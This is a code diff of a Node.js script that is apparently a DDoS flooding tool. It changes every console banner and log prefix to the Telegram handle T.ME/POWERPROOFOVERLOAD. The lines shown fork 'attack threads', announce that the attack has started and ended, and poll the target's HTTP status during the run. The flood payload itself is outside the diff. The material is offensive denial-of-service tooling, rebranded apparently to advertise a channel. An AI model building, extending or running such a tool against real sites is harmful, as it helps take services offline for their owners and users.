@@ -46,16 +46,16 @@
   Promise.race([axiosPromise, timeoutPromise])
     .then((response) => {
       const { status, data } = response;
-      console.log(`[\x1b[35mLIS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+      console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
     })
     .catch((error) => {
       if (error.message === 'Request timed out') {
-        console.log(`[\x1b[35mLIS\x1b[0m] ${getCurrentTime()} Request Timed Out`);
+        console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} Request Timed Out`);
       } else if (error.response) {
         const extractedTitle = getTitleFromHTML(error.response.data);
-        console.log(`[\x1b[35mLIS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+        console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
       } else {
-        console.log(`[\x1b[35mLIS\x1b[0m] ${getCurrentTime()} ${error.message}`);
+        console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} ${error.message}`);
       }
     });
 }
@@ -142,15 +142,15 @@ if (cluster.isMaster){
 STRET •~•
                                         
 `);
-  console.log(`\x1b[96mREXON \x1b[0m`);
+  console.log(`\x1b[96mT.ME/POWERPROOFOVERLOAD \x1b[0m`);
   for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
-    console.log(`[\x1b[35mSTRET •~•\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
+    console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
   }
-  console.log(`[\x1b[35mSTRET •~•\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
+  console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
   setInterval(getStatus, 2000);
   setTimeout(() => {
-    console.log(`[\x1b[35mSTRET •~•\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+    console.log(`[\x1b[35mT.ME/POWERPROOFOVERLOAD\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
     process.exit(1);
   }, process.argv[3] * 1000);
 } 
